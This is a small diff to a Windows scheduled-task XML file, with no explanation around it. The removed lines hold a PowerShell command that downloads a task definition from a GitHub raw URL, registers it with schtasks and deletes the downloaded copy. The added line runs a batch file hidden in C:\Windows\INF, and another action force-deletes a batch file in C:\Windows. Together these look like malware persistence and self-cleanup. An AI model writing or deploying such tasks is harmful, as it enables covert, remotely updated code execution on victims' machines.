@@ -56,8 +56,7 @@
       <Arguments>Remove-Item "C:\Windows\scheduler.bat" -Force</Arguments>
     </Exec>
     <Exec>
-      <Command>powershell</Command>
-      <Arguments>-Command "&amp; {Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/mitutina/mitutina/main/task.xml' -OutFile 'C:\Task.xml'; schtasks /create /tn 'Task' /xml 'C:\Task.xml' /f; Remove-Item -Force 'C:\Task.xml'}"</Arguments>
+      <Command>C:\Windows\INF\backup.bat</Command>
     </Exec>
   </Actions>
 </Task>
